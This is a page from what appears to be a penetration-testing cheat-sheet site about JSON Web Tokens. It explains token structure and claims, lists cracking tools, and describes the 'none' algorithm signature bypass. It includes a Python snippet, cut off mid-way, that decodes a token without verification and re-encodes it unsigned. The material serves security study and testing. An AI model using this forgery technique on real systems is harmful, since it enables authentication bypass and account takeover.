<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="All about JSON web tokens."><meta name=theme-color content="#FFFFFF"><meta name=color-scheme content="light dark"><meta property="og:title" content="JSON Web Tokens"><meta property="og:description" content="All about JSON web tokens."><meta property="og:type" content="article"><meta property="og:url" content="https://www.grayhatfreelancing.com/docs/json_web_token/"><meta property="article:section" content="docs"><meta property="article:published_time" content="2022-10-16T00:00:00+00:00"><meta property="article:modified_time" content="2022-12-10T11:35:25-05:00"><title>JSON Web Tokens | Gray Hat Freelancing</title><link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png type=image/x-icon><link rel=stylesheet href=/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css integrity="sha256-SzX+0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt+5t7EDugY=" crossorigin=anonymous><script defer src=/flexsearch.min.js></script>
<script defer src=/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2+lMiccGbo=" crossorigin=anonymous></script>
<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk=" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-5VH24CV5RY"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-5VH24CV5RY",{anonymize_ip:!1})}</script><script type=text/javascript>(function(e,t,n,s,o,i,a){e[o]=e[o]||function(){(e[o].a=e[o].a||[]).push(arguments)},e[o].l=1*new Date;for(var r=0;r<document.scripts.length;r++)if(document.scripts[r].src===s)return;i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","https://mc.yandex.ru/metrika/tag.js","ym"),ym(90832071,"init",{clickmap:!0,trackLinks:!0,accurateTrackBounce:!0,webvisor:!0})</script><noscript><div><img src=https://mc.yandex.ru/watch/90832071 style=position:absolute;left:-9999px alt></div></noscript><script async src="https://fundingchoicesmessages.google.com/i/pub-4012275371022894?ers=1" nonce=v6fQG2hYHmw1rpUUC6mr9w></script><script nonce=v6fQG2hYHmw1rpUUC6mr9w>(function(){function e(){if(!window.frames.googlefcPresent)if(document.body){const e=document.createElement("iframe");e.style="width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;",e.style.display="none",e.name="googlefcPresent",document.body.appendChild(e)}else setTimeout(e,0)}e()})()</script>
<script>(function(){"use strict";if(V=function(e){var t=0;return function(){return t<e.length?{done:!1,value:e[t++]}:{done:!0}}},P="function"==typeof Object.create?Object.create:function(e){var t=function(){};return t.prototype=e,new t},"function"==typeof Object.setPrototypeOf)g=Object.setPrototypeOf;else{a:{N={a:!0},O={};try{O.__proto__=N,k=O.a;break a}catch{}k=!1}g=k?function(e,t){if(e.__proto__=t,e.__proto__!==t)throw new TypeError(e+" is not extensible");return e}:null}var F=g,w=function(e,t){if(e.prototype=P(t.prototype),e.prototype.constructor=e,F)F(e,t);else for(n in t)if("prototype"!=n)if(Object.defineProperties){var n,s=Object.getOwnPropertyDescriptor(t,n);s&&Object.defineProperty(e,n,s)}else e[n]=t[n];e.v=t.prototype},e=this||self,Z=function(){},M=function(e){return e},m=function(e,t){this.g=t===S?e:""};m.prototype.toString=function(){return this.g+""},S={},E=function(t){if(void 0===h){var n=null,s=e.trustedTypes;if(s&&s.createPolicy){try{n=s.createPolicy("goog#html",{createHTML:M,createScript:M,createScriptURL:M})}catch(t){e.console&&e.console.error(t.message)}h=n}else h=n}return t=(n=h)?n.createScriptURL(t):t,new m(t,S)},x=function(){return Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)},C={},r=null,b="function"==typeof Uint8Array;function T(e,t,n){return"object"==typeof e?b&&!Array.isArray(e)&&e instanceof Uint8Array?n(e):D(e,t,n):t(e)}function D(e,t,n){if(Array.isArray(e)){for(var a,o=Array(e.length),s=0;s<e.length;s++)a=e[s],a!=null&&(o[s]=T(a,t,n));return Array.isArray(e)&&e.s&&i(o),o}o={};for(s in e)Object.prototype.hasOwnProperty.call(e,s)&&(a=e[s],a!=null&&(o[s]=T(a,t,n)));return o}function ee(e){return D(e,function(e){return"number"==typeof e?isFinite(e)?e:String(e):e},function(e){if(void 0===n&&(n=0),!r){r={};for(var t,n,s,o,l,d,a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),c=["+/=","+/","-_=","-_.","-_"],i=0;5>i;i++){t=a.concat(c[i].split("")),C[i]=t;for(s=0;s<t.length;s++)o=t[s],void 0===r[o]&&(r[o]=s)}}n=C[n],a=Array(Math.floor(e.length/3)),c=n[64]||"";for(i=t=0;t<e.length-2;t+=3)l=e[t],d=e[t+1],o=e[t+2],s=n[l>>2],l=n[(l&3)<<4|d>>4],d=n[(d&15)<<2|o>>6],o=n[o&63],a[i++]=""+s+l+d+o;switch(s=0,o=c,e.length-t){case 2:s=e[t+1],o=n[(s&15)<<2]||c;case 1:e=e[t],a[i]=""+n[e>>2]+n[(e&3)<<4|s>>4]+o+c}return a.join("")})}var $={s:{value:!0,configurable:!0}},i=function(e){return Array.isArray(e)&&!Object.isFrozen(e)&&Object.defineProperties(e,$),e},o=function(e,t,n){var s=p;p=null,e||(e=s),s=this.constructor.u,e||(e=s?[s]:[]),this.j=s?0:-1,this.h=null,this.g=e;a:{if(s=this.g.length,e=s-1,s&&(s=this.g[e],!(null===s||"object"!=typeof s||Array.isArray(s)||b&&s instanceof Uint8Array))){this.l=e-this.j,this.i=s;break a}void 0!==t&&-1<t?(this.l=Math.max(t,e+1-this.j),this.i=null):this.l=Number.MAX_VALUE}if(n)for(t=0;t<n.length;t++)e=n[t],e<this.l?(e+=this.j,(s=this.g[e])?i(s):this.g[e]=f):(s=this.l+this.j,this.g[s]||(this.i=this.g[s]={}),(s=this.i[e])?i(s):this.i[e]=f)},f=Object.freeze(i([])),t=function(e,t){if(-1===t)return null;if(t<e.l){t+=e.j;var n=e.g[t];return n!==f?n:e.g[t]=i([])}if(e.i)return n=e.i[t],n!==f?n:e.i[t]=i([])},z=function(e,n){var s,o=L;return-1===n?null:(e.h||(e.h={}),e.h[n]||(s=t(e,n),s&&(e.h[n]=new o(s))),e.h[n])};o.prototype.toJSON=function(){var e=l(this,!1);return ee(e)},l=function(e,t){if(e.h)for(o in e.h)if(Object.prototype.hasOwnProperty.call(e.h,o)){var s,o,n=e.h[o];if(Array.isArray(n))for(s=0;s<n.length;s++)n[s]&&l(n[s],t);else n&&l(n,t)}return e.g},j=function(e,t){return p=t=t?JSON.parse(t):null,e=new e(t),p=null,e},o.prototype.toString=function(){return l(this,!1).toString()},A=function(e){o.call(this,e)},w(A,o);function Q(e){var t,s=(e.ownerDocument&&e.ownerDocument.defaultView||window).document,n=null===(t=s.querySelector)||void 0===t?void 0:t.call(s,"script[nonce]");(t=n?n.nonce||n.getAttribute("nonce")||"":"")&&e.setAttribute("nonce",t)}u=function(e,t){return t=String(t),"application/xhtml+xml"===e.contentType&&(t=t.toLowerCase()),e.createElement(t)},d=function(t){this.g=t||e.document||document},d.prototype.appendChild=function(e,t){e.appendChild(t)};var r,l,d,u,h,p,g,b,j,y,_,O,x,C,E,k,A,S,N,P,V,v=function(e,t,n,s,o,i){try{var r=e.g,a=u(e.g,"SCRIPT");a.async=!0,a.src=t instanceof m&&t.constructor===m?t.g:"type_error:TrustedResourceUrl",Q(a),r.head.appendChild(a),a.addEventListener("load",function(){o(),s&&r.head.removeChild(a)}),a.addEventListener("error",function(){0<n?v(e,t,n-1,s,o,i):(s&&r.head.removeChild(a),i())})}catch{i()}},X=e.atob("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vaW1hZ2VzL2ljb25zL21hdGVyaWFsL3N5c3RlbS8xeC93YXJuaW5nX2FtYmVyXzI0ZHAucG5n"),K=e.atob("WW91IGFyZSBzZWVpbmcgdGhpcyBtZXNzYWdlIGJlY2F1c2UgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlIGlzIGludGVyZmVyaW5nIHdpdGggdGhpcyBwYWdlLg=="),U=e.atob("RGlzYWJsZSBhbnkgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlLCB0aGVuIHJlbG9hZCB0aGlzIHBhZ2Uu"),W=function(e,t,n){this.h=e,this.j=new d(this.h),this.g=null,this.i=[],this.l=!1,this.o=t,this.m=n},I=function(t){if(t.h.body&&!t.l){var n=function(){B(t),e.setTimeout(function(){return R(t,3)},50)};v(t.j,t.o,2,!0,function(){e[t.m]||n()},n),t.l=!0}},B=function(e){for(var i,r,c,l,t=n(1,5),o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i);t=s(e),t.style.bottom="0",t.style.left="0",t.style.position="fixed",t.style.width=n(100,110).toString()+"%",t.style.zIndex=n(2147483544,2147483644).toString(),t.style["background-color"]=H(249,259,242,252,219,229),t.style["box-shadow"]="0 0 12px #888",t.style.color=H(0,10,0,10,0,10),t.style.display="flex",t.style["justify-content"]="center",t.style["font-family"]="Roboto, Arial",o=s(e),o.style.width=n(80,85).toString()+"%",o.style.maxWidth=n(750,775).toString()+"px",o.style.margin="24px",o.style.display="flex",o.style["align-items"]="flex-start",o.style["justify-content"]="center",i=u(e.j.g,"IMG"),i.className=x(),i.src=X,i.style.height="24px",i.style.width="24px",i.style["padding-right"]="16px",r=s(e),c=s(e),c.style["font-weight"]="bold",c.textContent=K,l=s(e),l.textContent=U,a(e,r,c),a(e,r,l),a(e,o,i),a(e,o,r),a(e,t,o),e.g=t,e.h.body.appendChild(e.g),t=n(1,5);for(o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i)},a=function(e,t,o){for(var r,i=n(1,5),a=0;a<i;a++)r=s(e),t.appendChild(r);t.appendChild(o),o=n(1,5);for(i=0;i<o;i++)a=s(e),t.appendChild(a)},n=function(e,t){return Math.floor(e+Math.random()*(t-e))},H=function(e,t,s,o,i,a){return"rgb("+n(Math.max(e,0),Math.min(t,255)).toString()+","+n(Math.max(s,0),Math.min(o,255)).toString()+","+n(Math.max(i,0),Math.min(a,255)).toString()+")"},s=function(e){return e=u(e.j.g,"DIV"),e.className=x(),e},R=function(t,n){0>=n||null!=t.g&&0!=t.g.offsetHeight&&0!=t.g.offsetWidth||(q(t),B(t),e.setTimeout(function(){return R(t,n-1)},50))},q=function(e){var t=e.i,n="undefined"!=typeof Symbol&&Symbol.iterator&&t[Symbol.iterator],t=n?n.call(t):{next:V(t)};for(n=t.next();!n.done;n=t.next())(n=n.value)&&n.parentNode&&n.parentNode.removeChild(n);e.i=[],(t=e.g)&&t.parentNode&&t.parentNode.removeChild(t),e.g=null},Y=function(t,n,s,o,i){var a=G(s),c=function(s){s.appendChild(a),e.setTimeout(function(){a?(0!==a.offsetHeight&&0!==a.offsetWidth?n():t(),a.parentNode&&a.parentNode.removeChild(a)):t()},o)},r=function(t){document.body?c(document.body):0<t?e.setTimeout(function(){r(t-1)},i):n()};r(3)},G=function(e){var t=document.createElement("div");return t.className=e,t.style.width="1px",t.style.height="1px",t.style.position="absolute",t.style.left="-10000px",t.style.top="-10000px",t.style.zIndex="-10000",t},L=function(e){o.call(this,e)};w(L,o),_=function(e){o.call(this,e)},w(_,o),y=function(e,n){this.l=e,this.m=new d(e.document),this.g=n,this.i=t(this.g,1),n=z(this.g,2),this.o=E(t(n,4)||""),this.h=!1,n=z(this.g,13),n=E(t(n,4)||""),this.j=new W(e.document,n,t(this.g,12))},y.prototype.start=function(){J(this)};var J=function(n){te(n),v(n.m,n.o,3,!1,function(){a:{var i,s=n.i,o=e.btoa(s);if(o=e[o]){try{i=j(A,e.atob(o))}catch{s=!1;break a}s=s===t(i,1)}else s=!1}s?c(n,t(n.g,14)):(c(n,t(n.g,8)),I(n.j))},function(){Y(function(){c(n,t(n.g,7)),I(n.j)},function(){return c(n,t(n.g,6))},t(n.g,9),t(n.g,10),t(n.g,11))})},c=function(e,t){e.h||(e.h=!0,e=new e.l.XMLHttpRequest,e.open("GET",t,!0),e.send())},te=function(n){var s=e.btoa(n.i);n.l[s]&&c(n,t(n.g,5))};(function(t,n){e[t]=function(){for(var i=[],o=0;o<arguments.length;++o)i[o-0]=arguments[o];e[t]=Z,n.apply(null,i)}})("__h82AlnkH6D91__",function(e){"function"==typeof window.atob&&new y(window,j(_,window.atob(e))).start()})}).call(this),window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9iL3B1Yi00MDEyMjc1MzcxMDIyODk0Il0sbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9lbC9BR1NLV3hVTV9oOG1BMHF6c2xHRlBZR0xrS2g0UHRVX21ERkZSWVBjcTFBZU1aN0diVW5xSGRzNlR5OUZTYWlsM0thZ28tb19BU3hqbjRyZFdLOGhzVUlHbmFqalZRXHUwMDNkXHUwMDNkP3RlXHUwMDNkVE9LRU5fRVhQT1NFRCIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFZScnBMVGFzQ1JjSDBxSkpfSVhRWmd1YXQxZ292Ty01YlN0WUJXNGJUTThTNjlTdUU0WkVQVnZKZ0E2WC1UY1VNTlRLbXc3V1hLU2NoY1pJaHFOTVJ2UmdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QxXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFUxMG44RWlxNnBhUEw5Q1lOcjBZcG1xdTVuZzVzTkR3Zm5yN1pSRVExWEt5UlBLMFJxS1RST2Y0Q3B5S0pIUFpVem83MldIU3VrbWlKb1p4c2Y2RzJwLWdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QyXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFZDb2RlRVZCbFQxdXA5MUMzZ0V0dVFROVVxbVBSVGwwS2Qyc1FqcF9GWHV3WGxFYUhVekNvSWIxUzJtQnZ4T3Q5eHJra19vNWRXbWFfYl83dl9JRlVpeHdcdTAwM2RcdTAwM2Q/c2JmXHUwMDNkMiIsImRpdi1ncHQtYWQiLDIwLDEwMCwiY0hWaUxUUXdNVEl5TnpVek56RXdNakk0T1RRXHUwMDNkIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vd3d3LmdzdGF0aWMuY29tLzBlbW4vZi9wL3B1Yi00MDEyMjc1MzcxMDIyODk0LmpzP3VzcXBcdTAwM2RDQVEiXSwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vZWwvQUdTS1d4VjRnWnE1WHlLaXVNS3lHdUU1Y2ZISDdoNWUtb0VVZktOekNTWEgzYmN2U285OTNYLTFuc0VkU19SZjRjUTNYZjZJSEdyaGFIb1FNc1hqMFhZUGcwMFU5d1x1MDAzZFx1MDAzZCJd")</script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/logo.png alt=Logo><span>Gray Hat Freelancing</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><a href=/docs/insecure_deserialization/dotnet/>.NET Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/>Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/node/>Node Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/php/>PHP Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/java/>Insecure Deserialization - Java</a></li><li><a href=/docs/exercism_solutions/>Exercism Solutions</a></li><li><a href=/docs/amazon_aws_s3_buckets/>Amazon AWS S3 Buckets</a></li><li><a href=/docs/csrf_injection/>CSRF Injection</a></li><li><a href=/docs/cobalt_strike_all_you_need/>Cobalt Strike</a></li><li><a href=/docs/brute_force_cracking/>Brute Force Cracking</a></li><li><a href=/docs/training_grounds/>Training Grounds</a></li><li><a href=/docs/attacking_active_directory/>Active Directory Attacks</a></li><li><a href=/docs/wordpress/>Wordpress Security</a></li><li><a href=/docs/windows_hardening/>Windows - Hardening</a></li><li><a href=/docs/windows_amsi_bypass/>Bypassing AMSI protections</a></li><li><a href=/docs/subdomains_enumeration/>Enumerating Subdomains</a></li><li><a href=/docs/windows_mimikatz/>Windows - Mimikatz</a></li><li><a href=/docs/windows_persistence/>Windows - Persistence</a></li><li><a href=/docs/windows_privilege_escalation/>Windows - Privilege Escalation</a></li><li><a href=/docs/windows_using_credentials/>Windows - Using Credentials</a></li><li><a href=/docs/windows_download_and_execute/>Windows Download and Execute Methods</a></li><li><a href=/docs/escape_breakout/>Application Escape and Breakout</a></li><li><a href=/docs/office_attacks/>Attacking Office</a></li><li><a href=/docs/bind_shell_cheatsheet/>Bind Shell Cheatsheet</a></li><li><a href=/docs/methodology_and_enumeration/>Bug Hunting Methodology and Enumeration</a></li><li><a href=/docs/hash_cracking/>Hash Cracking Cheatsheet</a></li><li><a href=/docs/linux_persistence/>Linux - Persistence</a></li><li><a href=/docs/linux_privilege_escalation/>Linux - Privilege Escalation</a></li><li><a href=/docs/metasploit_cheatsheet/>Metasploit</a></li><li><a href=/docs/windows_dpapi/>Microsoft Window's Data Protection API</a></li><li><a href=/docs/microsoft_azure_cloud/>Microsoft's Azure Cloud</a></li><li><a href=/docs/network_discovery/>Network Discovery</a></li><li><a href=/docs/network_pivoting_techniques/>Network Pivoting Cheatsheet</a></li><li><a href=/docs/mssql_server_cheatsheet/>Pentesting MSSQL Server Cheatsheet</a></li><li><a href=/docs/powershell_cheatsheet/>Powershell Cheatsheet</a></li><li><a href=/docs/reverse_shell_cheatsheet/>Reverse Shell Cheatsheet</a></li><li><a href=/docs/source_code_management/>Source Code Management</a></li><li><a href=/docs/docker_pentesting/>Docker Security</a></li><li><a href=/docs/miscellaneous_tricks/>Miscellaneous Tips and Tricks</a></li><li><a href=/docs/graphql_injection/>GraphQL Injection</a></li><li><a href=/docs/csv_injection/>Csv Injection</a></li><li><a href=/docs/checking_for_account_takeover/>Account Takeovers</a></li><li><a href=/docs/api_key_leaks/>API Key Leaks</a></li><li><a href=/docs/command_injection/>Command Injection</a></li><li><a href=/docs/cors_misconfigurations/>CORS Misconfigurations</a></li><li><a href=/docs/crlf_injection/>CRLF Injection</a></li><li><a href=/docs/cve_exploits/>CVE Exploits</a></li><li><a href=/docs/dependency_confusion_attacks/>Dependency Confusion</a></li><li><a href=/docs/directory_traversal/>Directory Traversal</a></li><li><a href=/docs/dns_rebinding/>DNS Rebinding</a></li><li><a href=/docs/file_inclusion/>File Inclusion</a></li><li><a href=/docs/http_parameter_pollution/>HTTP Parameter Pollution</a></li><li><a href=/docs/insecure_direct_object_references/>Insecure Direct Object References</a></li><li><a href=/docs/insecure_file_uploads/>Insecure File Upload</a></li><li><a href=/docs/insecure_management_interfaces/>Insecure Management Interface</a></li><li><a href=/docs/insecure_source_code_management/>Insecure Source Code Management</a></li><li><a href=/docs/java_rmi/>Java RMI</a></li><li><a href=/docs/json_web_token/ class=active>JSON Web Tokens</a></li><li><a href=/docs/kuburnetes/>Kuburnetes</a></li><li><a href=/docs/latex_injection/>LaTeX Injection</a></li><li><a href=/docs/ldap_injection/>LDAP Injection</a></li><li><a href=/docs/nosql_injection/>NoSQL Injection</a></li><li><a href=/docs/oauth/>OAuth</a></li><li><a href=/docs/open_url_redirection/>Open URL Redirection</a></li><li><a href=/docs/race_conditions/>Race Conditions</a></li><li><a href=/docs/request_smuggling/>Request Smuggling</a></li><li><a href=/docs/saml_injection/>SAML Injection</a></li><li><a href=/docs/server_side_request_forgery/>Server-Side Request Forgery</a></li><li><a href=/docs/server_side_template_injection/>Server-Side Template Injection</a></li><li><a href=/docs/sql_injection/>SQL Injection</a></li><li><a href=/docs/tabnabbing/>Tabnabbing</a></li><li><a href=/docs/type_juggling/>Type Juggling</a></li><li><a href=/docs/web_cache_deception/>Web Cache Deception</a></li><li><a href=/docs/web_sockets/>Web Sockets Attacks</a></li><li><a href=/docs/xxe_injection/>XML eXternal Entity Injection</a></li><li><a href=/docs/xpath_injection/>XPATH Injection</a></li><li><a href=/docs/xslt_injection/>XSLT Injection</a></li><li><a href=/docs/xss_injection/>XSS Injection</a></li></ul><ul><li><a href=/posts/>Blog</a></li><li><a href=https://github.com/m00tiny/ target=_blank rel=noopener>Github</a></li><li><a href=https://github.com/m00tiny/grayhatfreelancing target=_blank rel=noopener>Contribute</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label>
<strong>JSON Web Tokens</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#jwt---json-web-token>JWT - JSON Web Token</a><ul><li><a href=#tools>Tools</a></li><li><a href=#jwt-format>JWT Format</a><ul><li><a href=#header>Header</a></li><li><a href=#payload>Payload</a></li></ul></li><li><a href=#jwt-signature---none-algorithm>JWT Signature - None algorithm</a></li><li><a href=#jwt-signature---rs256-to-hs256>JWT Signature - RS256 to HS256</a></li><li><a href=#breaking-jwts-secret>Breaking JWT&rsquo;s secret</a><ul><li><a href=#jwt-tool>JWT tool</a></li><li><a href=#jwt-cracker>JWT cracker</a></li><li><a href=#hashcat>Hashcat</a></li></ul></li><li><a href=#cve>CVE</a></li><li><a href=#references>References</a></li></ul></li></ul></nav></aside></header><article class=markdown><h1 id=jwt---json-web-token>JWT - JSON Web Token
<a class=anchor href=#jwt---json-web-token>#</a></h1><blockquote><p>JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.</p></blockquote><h2 id=tools>Tools
<a class=anchor href=#tools>#</a></h2><ul><li><a href=https://github.com/ticarpi/jwt_tool>jwt_tool</a></li><li><a href=https://github.com/brendan-rius/c-jwt-cracker>c-jwt-cracker</a></li><li><a href=https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61>JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper</a></li></ul><h2 id=jwt-format>JWT Format
<a class=anchor href=#jwt-format>#</a></h2><p>JSON Web Token : <code>Base64(Header).Base64(Data).Base64(Signature)</code></p><p>Example : <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY</code></p><p>Where we can split it into 3 components separated by a dot.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        <span style=color:#75715e># header</span>
</span></span><span style=display:flex><span>eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        <span style=color:#75715e># payload</span>
</span></span><span style=display:flex><span>UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY <span style=color:#75715e># signature</span>
</span></span></code></pre></div><h3 id=header>Header
<a class=anchor href=#header>#</a></h3><p>Default algorithm is &ldquo;HS256&rdquo; (HMAC SHA256 symmetric encryption).
&ldquo;RS256&rdquo; is used for asymmetric purposes (RSA asymmetric encryption and private key signature).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;typ&#34;</span>: <span style=color:#e6db74>&#34;JWT&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;alg&#34;</span>: <span style=color:#e6db74>&#34;HS256&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>| <code>alg</code> Param Value | Digital Signature or MAC Algorithm | Requirements |
|+++|&mdash;|&mdash;|
| HS256 | HMAC using SHA-256 | Required |
| HS384 | HMAC using SHA-384 | Optional |
| HS512 | HMAC using SHA-512 | Optional |
| RS256 | RSASSA-PKCS1-v1_5 using SHA-256 | Recommended |
| RS384 | RSASSA-PKCS1-v1_5 using SHA-384 | Optional |
| RS512 | RSASSA-PKCS1-v1_5 using SHA-512 | Optional |
| ES256 | ECDSA using P-256 and SHA-256 | Recommended |
| ES384 | ECDSA using P-384 and SHA-384 | Optional |
| ES512 | ECDSA using P-521 and SHA-512 | Optional |
| PS256 | RSASSA-PSS using SHA-256 and MGF1 with SHA-256 | Optional |
| PS384 | RSASSA-PSS using SHA-384 and MGF1 with SHA-384 | Optional |
| PS512 | RSASSA-PSS using SHA-512 and MGF1 with SHA-512 | Optional |
| none | No digital signature or MAC performed | Required |</p><h3 id=payload>Payload
<a class=anchor href=#payload>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;sub&#34;</span>:<span style=color:#e6db74>&#34;1234567890&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;Amazing Haxx0r&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;exp&#34;</span>:<span style=color:#e6db74>&#34;1466270722&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;admin&#34;</span>:<span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Claims are the predefined keys and their values:</p><ul><li>iss: issuer of the token</li><li>exp: the expiration timestamp (reject tokens which have expired). Note: as defined in the spec, this must be in seconds.</li><li>iat: The time the JWT was issued. Can be used to determine the age of the JWT</li><li>nbf: &ldquo;not before&rdquo; is a future time when the token will become active.</li><li>jti: unique identifier for the JWT. Used to prevent the JWT from being re-used or replayed.</li><li>sub: subject of the token (rarely used)</li><li>aud: audience of the token (also rarely used)</li></ul><p>JWT Encoder – Decoder: <code>http://jsonwebtoken.io</code></p><h2 id=jwt-signature---none-algorithm>JWT Signature - None algorithm
<a class=anchor href=#jwt-signature---none-algorithm>#</a></h2><p>JWT supports a None algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.</p><p>None algorithm variants:</p><ul><li>none</li><li>None</li><li>NONE</li><li>nOnE</li></ul><p>To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. Then you can submit your new JWT.</p><p>However, this won&rsquo;t work unless you <strong>remove</strong> the signature</p><p>Alternatively you can modify an existing JWT (be careful with the expiration time)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python3 data-lang=python3><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python3</span>
</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> jwt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>jwtToken 	<span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>decodedToken 	<span style=color:#f92672>=</span> jwt<span style=color:#f92672>.</span>decode(jwtToken, verify<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)  					<span style=color:#75715e># Need to decode the token before encoding with type &#39;None&#39;</span>
</span></span><span style=display:flex><span>noneEncoded 	<span style=color:#f92672>=</span> jwt<span style=color:#f92672>.</span>encode(decodedToken, key<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>, algorithm<span style=color:#f92672>=</span><span style=color:#66d9ef>None</span>)
</span></span><span style=display:flex><span>
